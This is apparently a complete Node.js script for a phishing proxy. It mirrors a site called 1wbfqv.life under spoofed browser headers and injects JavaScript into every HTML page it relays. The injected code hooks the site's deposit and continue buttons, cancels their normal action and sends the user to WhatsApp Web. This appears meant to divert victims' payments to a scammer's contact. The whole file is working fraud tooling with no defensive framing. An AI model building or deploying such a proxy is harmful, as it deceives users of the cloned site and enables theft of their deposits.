const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const zlib = require('zlib');

const app = express();
const TARGET = 'https://1wbfqv.life';

app.use('/', createProxyMiddleware({
  onProxyReq: (proxyReq, req, res) => {
    proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    proxyReq.setHeader('Referer', 'https://1wbfqv.life/');
    proxyReq.setHeader('Origin', 'https://1wbfqv.life');
  },
  target: TARGET,
  changeOrigin: true,
  selfHandleResponse: true,

  onProxyRes(proxyRes, req, res) {
    let body = Buffer.from([]);
    const encoding = proxyRes.headers['content-encoding'];

    proxyRes.on('data', chunk => body = Buffer.concat([body, chunk]));
    proxyRes.on('end', () => {
      let decodedBody;

      try {
        if (encoding === 'gzip') {
          decodedBody = zlib.gunzipSync(body).toString();
        } else if (encoding === 'br') {
          decodedBody = zlib.brotliDecompressSync(body).toString();
        } else {
          decodedBody = body.toString();
        }
      } catch (e) {
        console.error('Decode hatası:', e);
        return res.end(body);
      }

      const contentType = proxyRes.headers['content-type'] || '';
      const isHTML = contentType.includes('text/html');

      if (!isHTML || !decodedBody.includes('</body>')) {
        res.writeHead(proxyRes.statusCode || 200, proxyRes.headers);
        return res.end(body); // HTML değilse orijinalini gönder
      }

      const injectedScript = `
        <script>
          const redirectURL = 'https://web.whatsapp.com/';

          const handleClick = (e) => {
            e.preventDefault();
            location.href = redirectURL;
          };

          const observer = new MutationObserver(() => {
            const btn1 = document.querySelector('.DepositModal_sendButton_k1BfK');
            const btn2 = document.querySelector('.DepositCreate_button_ChZTr');

            if (btn1 && !btn1.dataset.hooked) {
              btn1.dataset.hooked = 'true';
              btn1.addEventListener('click', handleClick);
              console.log('[+] Para yatır butonuna listener eklendi');
            }

            if (btn2 && !btn2.dataset.hooked) {
              btn2.dataset.hooked = 'true';
              btn2.addEventListener('click', handleClick);
              console.log('[+] Devam et butonuna listener eklendi');
            }
          });

          observer.observe(document.body, { childList: true, subtree: true });
        </script>
      `;

      const modifiedBody = decodedBody.replace('</body>', injectedScript + '</body>');
      delete proxyRes.headers['content-encoding'];
      proxyRes.headers['content-length'] = Buffer.byteLength(modifiedBody);

      res.writeHead(proxyRes.statusCode || 200, proxyRes.headers);
      res.end(modifiedBody);
    });
  }
}));

app.listen(4000, () => {
  console.log('Proxy çalışıyor: http://localhost:4000');
});